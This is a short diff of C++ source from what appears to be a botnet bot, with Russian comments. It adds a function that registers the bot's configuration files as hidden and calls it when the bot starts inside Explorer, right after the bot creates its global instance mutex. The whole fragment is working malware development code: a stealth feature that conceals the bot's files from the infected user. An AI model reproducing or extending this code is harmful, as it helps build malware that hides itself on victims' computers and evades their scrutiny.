@@ -8,9 +8,26 @@
 #include "Pipes.h"
 #include "BotHosts.h"
 #include "BotCore.h"
+#include "StrConsts.h"
 
 #include "Modules.h"
 
+//---------------------------------------------------------------------------
+
+
+
+
+
+//-----------------------------------------------------------
+//  InitializeHiddenFiles - Функция инициализирует массив
+//                          файлов имена которых бот будет
+//                          прятать
+//-----------------------------------------------------------
+void InitializeHiddenFiles()
+{
+	BOT::AddHiddenFile(GetStr(EStrConfigFileName));
+	BOT::AddHiddenFile(GetStr(EStrConfigHPFileName));
+}
 
 //---------------------------------------------------------------------------
 
@@ -50,6 +67,10 @@ void ExplorerStart(PEventData Data)
 
 	// Создаём глобальный мьютекс, сигнализирующий о запущенном боте
 	BOT::TryCreateBotInstance();
+
+
+	// Инициализируем скрываемые файлы
+    InitializeHiddenFiles();
 
 
 	// Записываем текущие настроки в файл.
